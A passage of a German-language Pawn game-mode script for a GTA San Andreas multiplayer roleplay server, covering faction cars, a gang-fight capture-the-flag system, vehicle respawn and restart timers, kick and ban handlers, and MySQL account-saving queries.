					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Wheelman");
				}
				else if(FactionCars[fc][fFaction] == 22)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "S.W.A.T");
				}
				else if(FactionCars[fc][fFaction] == 23)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Russen Mafia");
				}
				else if(FactionCars[fc][fFaction] == 24)
				{
					SetVehicleNumberPlate(FactionCars[fc][fCarid], "Ordnungsamt");
				}
				SetVehicleToRespawn(FactionCars[fc][fCarid]);

			    if(FactionCars[fc][fTuning][14] != 0)
				{
				    if(FactionCars[fc][fVehid] == 560)
					{
						SireneFrak[FactionCars[fc][fCarid]] = CreateDynamicObject(19419,0,0,-1000,0,0,0,100);
						AttachDynamicObjectToVehicle(SireneFrak[FactionCars[fc][fCarid]], FactionCars[fc][fCarid], 0.000000,-0.150000,0.824999, 0.0, 0.0, 0.0);
					}
				}
			}
		}

			//fc++;
		}
   	}//fclose(fFile);
 //	return printf("  '%d' Fraktionsfahrzeuge wurden geladen & erstellt.",fc); // virtuelle welt ?
//}
/*
public SaveFactionCars(bool:destroy){
	if(fexist(FACTION_CAR_FILE)) fremove(FACTION_CAR_FILE);
    new File:fFile=fopen(FACTION_CAR_FILE,io_append),Content[1024];
    for(new fc;fc<sizeof(FactionCars);fc++){
    	if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611){
        	format(Content,sizeof(Content),"%d %.3f %.3f %.3f %.3f %03d %03d %02d %02d %02d %02d %02d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d\r\n",
			FactionCars[fc][fVehid],
			FactionCars[fc][fPos][0],
			FactionCars[fc][fPos][1],
			FactionCars[fc][fPos][2],
			FactionCars[fc][fPos][3],
			FactionCars[fc][fCol][0],
			FactionCars[fc][fCol][1],
			FactionCars[fc][fFaction][0],
			FactionCars[fc][fFaction][1],
			FactionCars[fc][fFaction][2],
			FactionCars[fc][fFaction][3],
			FactionCars[fc][fFaction][4],
			FactionCars[fc][fTuning][0],
	        FactionCars[fc][fTuning][1],
	        FactionCars[fc][fTuning][2],
	        FactionCars[fc][fTuning][3],
	        FactionCars[fc][fTuning][4],
	        FactionCars[fc][fTuning][5],
	        FactionCars[fc][fTuning][6],
	        FactionCars[fc][fTuning][7],
	        FactionCars[fc][fTuning][8],
	        FactionCars[fc][fTuning][9],
	        FactionCars[fc][fTuning][10],
            FactionCars[fc][fTuning][11],
            FactionCars[fc][fTuning][12],
            FactionCars[fc][fTuning][13],
            FactionCars[fc][fTuning][14],
            FactionCars[fc][fTuning][15],
            FactionCars[fc][fTuning][16],
            FactionCars[fc][fTuning][17],
			FactionCars[fc][fPrice]);
            fwrite(fFile,Content);
            if(destroy == true){
                if(DestroyVehicle(FactionCars[fc][fCarid]))
					FactionCars[fc][fCarid] = -255;
            }
		}
	}fclose(fFile);
	return true;
}*/



public RemoveComponent(vehicleid,componentid)
	return RemoveVehicleComponent(vehicleid,componentid);
public ChangePaintjob(vehicleid,paintjobid)
	return ChangeVehiclePaintjob(vehicleid,paintjobid);
public ChangeColor(vehicleid,color1,color2)
	return ChangeVehicleColor(vehicleid,color1,color2);



stock IsAllowedFactionToBuy(Faction){
	if(Faction){
		if((Faction >= 1 && Faction <= 24)/* || Faction >= 22 && Faction <= 25*/) return true;
	}return false;
}
stock GetDefaultCarColorOfFaction(Faction,&col1,&col2){
   	if(Faction==1)
	{
		col1 = 205;
	    col2 = 205;
	}
	if(Faction==2)
	{
		col1 = 205;
	    col2 = 205;
	}
	if(Faction==3)
	{
		col1 = 86;
	    col2 = 86;
	}
	if(Faction==4)
	{
		col1 = 3;
	    col2 = 3;
	}
	if(Faction==5)
	{
		col1 = 6;
	    col2 = 6;
	}
	else if(Faction==6)
	{
		col1 = 6;
	    col2 = 6;
	}
	else if(Faction==7)
	{
		col1 = 0;
	    col2 = 0;
	}
	else if(Faction==8)
	{
		col1 = 215;
	    col2 = 215;
	}
	else if(Faction==9)
	{
		col1 = 1;
	    col2 = 1;
	}
	else if(Faction==10)
	{
		col1 = 6;
	    col2 = 6;
	}
	else if(Faction==11)
	{
		col1 = 1;
	    col2 = 1;
	}
	else if(Faction==12)
	{
		col1 = 13;
	    col2 = 13;
	}
	else if(Faction==13)
	{
		col1 = 86;
	    col2 = 86;
	}
	else if(Faction==14)
	{
		col1 = 22;
	    col2 = 22;
	}
	else if(Faction==15)
	{
		col1 = 3;
	    col2 = 3;
	}
	else if(Faction==16)
	{
		col1 = 6;
	    col2 = 6;
	}
	else if(Faction==17)
	{
		col1 = 93;
	    col2 = 93;
	}
   	else if(Faction==18)
	{
		col1 = 12;
	    col2 = 12;
	}
	else if(Faction==19)
	{
		col1 = 0;
	    col2 = 0;
	}
   	else if(Faction==20)
	{
		col1 = 1;
	    col2 = 1;
	}
   	else if(Faction==21)
	{
		col1 = 0;
	    col2 = 0;
	}
   	else if(Faction==22)
	{
		col1 = 0;
	    col2 = 0;
	}
 	else if(Faction==23)
	{
		col1 = 1;
	    col2 = 1;
	}
	else if(Faction==24)
	{
		col1 = 205;
	    col2 = 205;
	}
	else
	{
	    col1 = 0;
	    col2 = 0;
	}
	return 1;
}
stock GetFactioncarsOfFaction(Faction){
	new Cars;
	for(new fc;fc<sizeof(FactionCars);fc++)
	{
	   	if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
		{
	       	if(FactionCars[fc][fFaction][0] == Faction)
	           	Cars++;
	   	}
	}return Cars;
}
//============================================================ Gangfight ==========================================================
forward GW_OnPlayerDisconnect(playerid);
public GW_OnPlayerDisconnect(playerid){
	for(new fs;fs<sizeof(FightSystem);fs++){
	    if(FightSystem[fs][fsAttackFaction] != -255 && FightSystem[fs][fsFightTime]){
	        if(FightSystem[fs][fsCTF][0] != -255 && FightSystem[fs][fsCTF][0] == playerid){
                new fsName[MAX_PLAYER_NAME];
    			GetPlayerName(FightSystem[fs][fsCTF][0],fsName,MAX_PLAYER_NAME);
    			new fsText[128];
	            format(fsText,sizeof(fsText),">>> Fight <<< | %s hat es nicht geschafft die Flagge zu erobern!",fsName);
	            for(new i;i<MAX_PLAYERS;i++){
	            	if(IsPlayerConnected(i)){
	                	if(GetPlayerFaction(i) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[fs][fsAttackFaction]){
							PlayerPlaySound(i,1058,0.0,0.0,0.0);
							SendClientMessage(i,FS_COL_YELLOW,fsText);
						}
					}
				}
	            FightSystem[fs][fsCTF][0] = -255;
	            FightSystem[fs][fsCTF][1] = 0;
	            FightSystem[fs][fsCTF][2] = 0;
	        }
	    	if(GetPVarInt(playerid,"Spawned")==1){
	        	GangZoneStopFlashForPlayer(playerid,FightSystem[fs][fsZoneID]);
	        	if(GetPlayerFaction(playerid) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(playerid) == FightSystem[fs][fsAttackFaction]){
					TextDrawHideForPlayer(playerid,Fight);
	        	    TextDrawHideForPlayer(playerid,FightUnderline);
	        	    TextDrawHideForPlayer(playerid,FightSystem[fs][fsWinFaction]);
	        	    TextDrawHideForPlayer(playerid,FightSystem[fs][fsLoseFaction]);
	        	    TextDrawHideForPlayer(playerid,FightSystem[fs][fsWinKills]);
	        	    TextDrawHideForPlayer(playerid,FightSystem[fs][fsLoseKills]);
	        	    TextDrawHideForPlayer(playerid,FightSystem[fs][fsTime]);
	        	}
			}
		}GangZoneHideForPlayer(playerid,FightSystem[fs][fsZoneID]);
	}DeletePVar(playerid,"Spawned");
	return 1;
}
forward GW_OnPlayerSpawn(playerid);
public GW_OnPlayerSpawn(playerid){
	if(GetPVarInt(playerid,"Spawned")==0){
	    SetPVarInt(playerid,"Spawned",1);
		for(new fs;fs<sizeof(FightSystem);fs++){
		    if(FightSystem[fs][fsAttackFaction] != -255 && FightSystem[fs][fsFightTime]){
	        	GangZoneFlashForPlayer(playerid,FightSystem[fs][fsZoneID],GetZoneColorOfFaction(FightSystem[fs][fsAttackFaction]));
	        	if(GetPlayerFaction(playerid) == FightSystem[fs][fsOwnerFaction] || GetPlayerFaction(playerid) == FightSystem[fs][fsAttackFaction]){
	        	    TextDrawShowForPlayer(playerid,Fight);
	        	    TextDrawShowForPlayer(playerid,FightUnderline);
	        	    TextDrawShowForPlayer(playerid,FightSystem[fs][fsWinFaction]);
	        	    TextDrawShowForPlayer(playerid,FightSystem[fs][fsLoseFaction]);
	        	    TextDrawShowForPlayer(playerid,FightSystem[fs][fsWinKills]);
	        	    TextDrawShowForPlayer(playerid,FightSystem[fs][fsLoseKills]);
	        	    TextDrawShowForPlayer(playerid,FightSystem[fs][fsTime]);
	        	}
			}
		}
	}return 1;
}
forward GW_OnPlayerDeath(playerid, killerid, reason);
public GW_OnPlayerDeath(playerid, killerid, reason){
	if(IsPlayerConnected(killerid)){
		if(IsAFightFaction(GetPlayerFaction(killerid))){
	    	new TempZone = GetPlayerFightzone(killerid);
	    	if(TempZone != -255){
	        	if(FightSystem[TempZone][fsFightTime] && FightSystem[TempZone][fsAttackFaction] != -255){
	            	if(FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(killerid) || FightSystem[TempZone][fsAttackFaction] == GetPlayerFaction(killerid)){
     	        		if(IsAFightFaction(GetPlayerFaction(playerid))){
     	        		    new fsText[64];
   	            			if(FightSystem[TempZone][fsAttackFaction] == GetPlayerFaction(killerid) && FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(playerid)){
						  		PlayerPlaySound(killerid,1084,0.0,0.0,0.0);
								GameTextForPlayer(killerid,"~g~GANGFIGHTKILL",3125,3);
								GameTextForPlayer(playerid,"~r~GANGFIGHTKILL",3125,3);
                    			FightSystem[TempZone][fsKillsOfAttack]++;
                    			if(FightSystem[TempZone][fsKillsOfOwner] > FightSystem[TempZone][fsKillsOfAttack]){
                    	    		format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}
                    			else if(FightSystem[TempZone][fsKillsOfAttack] > FightSystem[TempZone][fsKillsOfOwner]){
                        			format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}else{
                    		    	format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}
           					}
	            	        else if(FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(killerid) && FightSystem[TempZone][fsAttackFaction] == GetPlayerFaction(playerid)){
								PlayerPlaySound(killerid,1084,0.0,0.0,0.0);
								GameTextForPlayer(killerid,"~g~GANGFIGHTKILL",3125,3);
								GameTextForPlayer(playerid,"~r~GANGFIGHTKILL",3125,3);
                    			FightSystem[TempZone][fsKillsOfOwner]++;
                    			if(FightSystem[TempZone][fsKillsOfOwner] > FightSystem[TempZone][fsKillsOfAttack]){
                    	    		format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}
                    			else if(FightSystem[TempZone][fsKillsOfAttack] > FightSystem[TempZone][fsKillsOfOwner]){
                        			format(fsText,sizeof(fsText),"~g~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~g~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~r~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~r~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}else{
                    		    	format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				        			TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				        			format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[TempZone][fsKillsOfOwner]);
                        			TextDrawSetString(FightSystem[TempZone][fsWinKills],fsText);
									format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsAttackFaction]));
									TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				        			format(fsText,sizeof(fsText),"~y~%d Kills",FightSystem[TempZone][fsKillsOfAttack]);
									TextDrawSetString(FightSystem[TempZone][fsLoseKills],fsText);
                    			}
	            	        }
	            	    }
	            	}
	        	}
	    	}
		}
	}
	if(IsAFightFaction(GetPlayerFaction(playerid))){
       	new TempZone = GetPlayerFightzone(playerid);
		if(TempZone != -255){
	    	if(FightSystem[TempZone][fsFightTime] && FightSystem[TempZone][fsAttackFaction] != -255){
	        	if(FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(playerid) || FightSystem[TempZone][fsAttackFaction] == GetPlayerFaction(playerid)){
			    	if(FightSystem[TempZone][fsCTF][0] == playerid){
					    new fsName[MAX_PLAYER_NAME];
					    GetPlayerName(playerid,fsName,MAX_PLAYER_NAME);
					    new fsText[128];
			        	format(fsText,sizeof(fsText),">>> Fight <<< | %s hat es nicht geschafft die Flagge zu erobern.",fsName);
   						for(new i;i<MAX_PLAYERS;i++){
   						    if(IsPlayerConnected(i)){
	                    		if(GetPlayerFaction(i) == FightSystem[TempZone][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[TempZone][fsAttackFaction]){
									PlayerPlaySound(i,1058,0.0,0.0,0.0);
									SendClientMessage(i,FS_COL_YELLOW,fsText);
								}
							}
						}
			        	FightSystem[TempZone][fsCTF][0] = -255;
  						FightSystem[TempZone][fsCTF][1] = 0;
       					FightSystem[TempZone][fsCTF][2] = 0;
			  	  	}
				}
	    	}
		}
	}return 1;
}

//=====================================================================================================



Function IstInGangFight(playerid)
{
   	new TempZone = GetPlayerFightzone(playerid);
   	if(TempZone != -255){ // In Zone
       	if(FightSystem[TempZone][fsFightTime] && FightSystem[TempZone][fsAttackFaction] != -255){ // Wenn Gegner nicht gleich -255 ist
       	    return 1;
       	}
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(IsACop(forplayerid) && WantedLevel[playerid] >= 1)
	{
       	format(stringx, sizeof(stringx), "-= %s =- \n -= Wantedlevel: %d =-", MeinName(playerid), WantedLevel[playerid]);
		WantedLabel[playerid] = CreatePlayer3DTextLabel(forplayerid, stringx, 0xC50000FF,0.0,0.0,0.5, 30.0, playerid,INVALID_VEHICLE_ID, 0);
	}
    return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	DeletePlayer3DTextLabel(forplayerid, WantedLabel[playerid]);
    return 1;
}


Function zugpause(playerid)
{
	if(PlayerInfo[playerid][pJob]==3)
	{
		SendClientMessage(playerid,COLOR_RED,"Die Pause ist nun vorbei du kannst wieder Zug fahren");
 		ZUGCheckpoint[playerid]=0;
	}
}
forward respawncars();
public respawncars()
{
    SendClientMessageToAll(RED,"* Alle unbesetzten Fahrzeuge werden in 30 Sekunden respawnt!");
    SetTimer("respawncars2",10000,0);
	return 1;
}
forward respawncars2();
public respawncars2()
{
    SendClientMessageToAll(RED,"* Alle unbesetzten Fahrzeuge werden in 20 Sekunden respawnt!");
    SetTimer("respawncars3",10000,0);
	return 1;
}
forward respawncars3();
public respawncars3()
{
    SendClientMessageToAll(RED,"* Alle unbesetzten Fahrzeuge werden in 10 Sekunden respawnt!");

    SetTimer("respawncars4",10000,0);
	return 1;
}
forward respawncars4();
public respawncars4()
{
    SetTimer("respawncars5",10000,0);
	return 1;
}
forward respawncars5();
public respawncars5()
{
    		SendClientMessageToAll(RED,"* Alle unbesetzten Fahrzeuge wurden Respawnt!");
			new bool:unwanted[MAX_VEHICLES];
			for(new player=0; player<MAX_PLAYERS; player++)
 			{
        		if(IsPlayerInAnyVehicle(player))
				{
				unwanted[GetPlayerVehicleID(player)]=true;
				}
 			}
			for(new car = 1; car<MAX_VEHICLES; car++)
			{
				if(!unwanted[car])
				{
				    for(new fc;fc<sizeof(FactionCars);fc++)
					{
					    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
					        if(FactionCars[fc][fCarid] == car)
							{
								DestroyAndCreateFactionCar(fc);
							}
						}
					}
  					for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
					{
					    for(new x = 0; x < MaxVeh; x++)
						{
							if(IsPlayerConnected(playerid) && Dtc_PlayerHaveCar[playerid][x])
							{
					    	 	if (car == PlayerCar[playerid][x][CarId])
						     	{
					        		SetTimerEx("DestroyAndCreateCar",8000,0,"dd",playerid,x);
						       	}
							}
						}
					}
				}
			}
	return 1;
}
forward Restart1();
public Restart1()
{


    SendClientMessageToAll(RED,"* Serverneustart");
    SetTimer("Restart2",5000,0);
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		Kick(i);
	}
	return 1;
}

forward Restart2();
public Restart2()
{
	SendRconCommand("gmx");
	return 1;
}


stock UnFreezePlayer(player)
{
	TogglePlayerControllable(player, 1);
}
stock FreezePlayer(player)
{
	TogglePlayerControllable(player, 0);
}
/*
stock GetVehicleDriver(vehicleid){
	if(vehicleid < 1 || vehicleid > sizeof(VehicleDriverPlayerid)) return INVALID_PLAYER_ID;
	if(VehicleDriverPlayerid[vehicleid - 1] != INVALID_PLAYER_ID  && IsPlayerInVehicle(VehicleDriverPlayerid[vehicleid - 1], vehicleid) && GetPlayerVehicleSeat(VehicleDriverPlayerid[vehicleid - 1]) == 0)return VehicleDriverPlayerid[vehicleid - 1];
	return VehicleDriverPlayerid[vehicleid - 1] = INVALID_PLAYER_ID;
}
*/
stock SendClientMessageToAllEx(color, string[])
{
	new count, lenght = 72;
	for(new i, l = strlen(string); i != l; i++)
	{
		if(string[i] == '{' && string[i+7] == '}')
			count += 8;
	}
	if(strlen(string) > (lenght+count))
	{
		new text[2][128];
		strmid(text[0], string, 0, lenght+count);
		strmid(text[1], string, lenght+count, strlen(string));
		format(text[0], 128, "%s...", text[0]);
		SendClientMessageToAll(color, text[0]);
		format(text[1], 128, "...%s", text[1]);
		SendClientMessageToAll(color, text[1]);
		return 1;
	}
	SendClientMessageToAll(color, string);
	return 1;
}
stock SendClientMessageEx(playerid, color, string[])
{
	new count, lenght = 72;
	for (new i, l = strlen(string); i != l; i++)
	{
		if(string[i] == '{' && string[i+7] == '}')
			count += 8;
	}
	if(strlen(string) > (lenght+count))
	{
		new text[2][128];
		strmid(text[0], string, 0, lenght+count);
		strmid(text[1], string, lenght+count, strlen(string));
		format(text[0], 128, "%s...", text[0]);
		SendClientMessage(playerid, color, text[0]);
		format(text[1], 128, "...%s", text[1]);
		SendClientMessage(playerid, color, text[1]);
		return 1;
	}
	SendClientMessage(playerid, color, string);
	return 1;
}

//______________________________________________________________________________



forward GetPlayerFrak(playerid);
public GetPlayerFrak(playerid)
{
    return PlayerInfo[playerid][sMember];
}
stock GetFrakRang(rang,id)
{
	new Get[128];
    switch(rang)
    {
        case 0:
        {
            format(Get,sizeof(Get),"%s","Nichts");
		}
		case 1:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang1]);
		}
		case 2:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang2]);
		}
		case 3:
		{
        format(Get,sizeof(Get),"%s",Rangname[id][Rang3]);
		}
		case 4:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang4]);
		}
		case 5:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang5]);
		}
		case 6:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang6]);
		}
		case 7:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang7]);
		}
		case 8:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang8]);
		}
		case 9:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang9]);
		}
		case 10:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang10]);
		}
		case 11:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang11]);
		}
		case 12:
		{
		format(Get,sizeof(Get),"%s",Rangname[id][Rang12]);
		}
	}
	return Get;
}
public AntiFakekillTimer(playerid)
{
    AntiFakekill[playerid]--;
    if(AntiFakekill[playerid] > 2)
    {
		format(stringtu, sizeof(stringtu), "%s wurde vom Server gekickt, Grund: Fakekill", GetName(playerid));
		SendClientMessageToAll(COLOR_RED, stringtu);
        TogglePlayerControllable(playerid, false);
        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
    }
    return 1;
}
stock GetName(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid,name,sizeof(name));
    return name;
}
public kicktimerfake(playerid)
{
    Kick(playerid);
    return 1;
}
public kicktimer(giveplayerid)
{
    Kick(giveplayerid);
    return 1;
}
public bantimer(giveplayerid)
{
    Ban(giveplayerid);
    return 1;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
    FRAC_OnVehiclePaintjob(playerid, vehicleid, paintjobid);
	for(new x = 0; x < MaxVeh; x++)
	{
		if (vehicleid == PlayerCar[playerid][x][CarId] && Dtc_PlayerHaveCar[playerid][x])
		{
		    PlayerCar[playerid][x][CarPJ] = paintjobid;
//		    PlayerCar[playerid][x][CarC1] = 1;
//		    PlayerCar[playerid][x][CarC2] = 1;
		}
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
    FRAC_OnVehicleRespray(playerid, vehicleid, color1, color2);
    for(new x = 0; x < MaxVeh; x++)
	{
		if (vehicleid == PlayerCar[playerid][x][CarId] && Dtc_PlayerHaveCar[playerid][x])
		{
		    PlayerCar[playerid][x][CarC1] = color1;
		    PlayerCar[playerid][x][CarC2] = color2;
		}
	}
	return 1;
}
public OnVehicleMod(playerid,vehicleid,componentid)
{
	new vehicleide = GetVehicleModel(vehicleid);
	new modok = islegalcarmod(vehicleide, componentid);
	if (!modok)
	{
		SetVehicleToRespawn(vehicleid);
		format(stringtu, sizeof(stringtu), "%s wurde vom Server gekickt, Grund: Vehicle Crasher", GetName(playerid));
		SendClientMessageToAll(COLOR_RED, stringtu);
        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
		return 0;
	}
    FRAC_OnVehicleMod(playerid, vehicleid, componentid);
    for(new X = 0; X < MaxVeh; X++)
	{
		if (vehicleid == PlayerCar[playerid][X][CarId] && Dtc_PlayerHaveCar[playerid][X])
		{
			if((componentid >= 1008) && (componentid <= 1010)) {PlayerCar[playerid][X][CarNitro] = componentid;}
			if((componentid >= 1142) && (componentid <= 1145)) {PlayerCar[playerid][X][CarVents] = componentid;}
			if((componentid == 1013) || (componentid == 1024)) {PlayerCar[playerid][X][CarLamps] = componentid;}
			if((componentid >= 1004) && (componentid <= 1005)||(componentid >= 1011) && (componentid <= 1012)) { PlayerCar[playerid][X][CarHood] = componentid; }
			if(componentid == 1087) {PlayerCar[playerid][X][CarHyd] = componentid;}
			if(componentid == 1086) {PlayerCar[playerid][X][CarHyd] = componentid;}
			if(IsAWheel(componentid)) {PlayerCar[playerid][X][CarWheel] = componentid;}
			if(IsAExhaust(componentid)) {PlayerCar[playerid][X][CarAusp] = componentid;}
			if(IsASideL(componentid)) {PlayerCar[playerid][X][CarSideL] = componentid; PlayerCar[playerid][X][CarSideR] = SideR;}
			if(IsASideR(componentid)) {PlayerCar[playerid][X][CarSideR] = componentid; PlayerCar[playerid][X][CarSideL] = SideL;}
			if(IsAFB(componentid)) {PlayerCar[playerid][X][CarFB] = componentid;}
			if(IsARB(componentid)) {PlayerCar[playerid][X][CarRB] = componentid;}
			if(IsASpoiler(componentid)) {PlayerCar[playerid][X][CarSpoiler] = componentid;}
			if(IsARoof(componentid)) {PlayerCar[playerid][X][CarRoof] = componentid;}
			if(componentid == 1086) {PlayerCar[playerid][X][SoundSystem] = 1;}
		}
	}
	return 1;// if(IsASideR(componentid))
}
stock PlayerName(playerid)
{
        new name[MAX_PLAYER_NAME];
        GetPlayerName(playerid, name, MAX_PLAYER_NAME);
        return name;
}
public SaveMysqlPlayer(playerid)
{
    if(IsPlayerConnected(playerid) && !IsPlayerNPC(playerid)) //wir überprüfen ob der Spieler überhaupt noch Connected ist und ob er nicht ein NPC ist.
    {
        if(gPlayerLogged[playerid] == 1) //Und hier ob er noch eingeloggt ist.
        {
            new query[2048];
  //          PlayerInfo[playerid][pCash] = GetPlayerMoneySave(playerid);

	        format(query, sizeof(query), "UPDATE `accounts` SET admin = '%d',level = '%d',reg = '%d',sex = '%d',age = '%d',origin = '%d',ck = '%d',muted = '%d',exp = '%d', pBomben='%d', TutorialGemacht='%d',StartBonusErhalten='%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pAdmin],PlayerInfo[playerid][pLevel],PlayerInfo[playerid][pReg],PlayerInfo[playerid][pSex],
			PlayerInfo[playerid][pAge],PlayerInfo[playerid][pOrigin],PlayerInfo[playerid][pCK],PlayerInfo[playerid][pMuted],PlayerInfo[playerid][pExp],PlayerInfo[playerid][pBomben],TutorialGemacht[playerid], StartBonusErhalten[playerid],PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET cash = '%d',account = '%d',crimes = '%d',kills = '%d',deaths = '%d',arrested = '%d',wanteddeaths = '%d',phonebook = '%d',lottonr = '%d',fishes = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pCash],PlayerInfo[playerid][pAccount],PlayerInfo[playerid][pCrimes],PlayerInfo[playerid][pKills],PlayerInfo[playerid][pDeaths],
			PlayerInfo[playerid][pArrested],PlayerInfo[playerid][pWantedDeaths],PlayerInfo[playerid][pPhoneBook],PlayerInfo[playerid][pLottoNr],PlayerInfo[playerid][pFishes], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET biggestfish = '%d',job = '%d',paycheck = '%d',headvalue = '%d',jailed = '%d',gangjailed = '%d',mauled = '%d',jailtime = '%d',drugs = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pBiggestFish],PlayerInfo[playerid][pJob],PlayerInfo[playerid][pPayCheck],PlayerInfo[playerid][pHeadValue],
			PlayerInfo[playerid][pJailed],PlayerInfo[playerid][pGangJailed],PlayerInfo[playerid][pMauled],PlayerInfo[playerid][pJailTime],PlayerInfo[playerid][pDrugs], PlayerInfo[playerid][Name]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

	        format(query, sizeof(query), "UPDATE `accounts` SET lawskill = '%d',mechskill = '%d',jackskill = '%d',carskill = '%d',newsskill = '%d',drugsskill = '%d',cookskill = '%d',fishskill = '%d',shealth = '%d',health = '%d' WHERE `name` = '%s'",
			PlayerInfo[playerid][pLawSkill],PlayerInfo[playerid][pMechSkill],PlayerInfo[playerid][pJackSkill],PlayerInfo[playerid][pCarSkill],PlayerInfo[playerid][pNewsSkill],
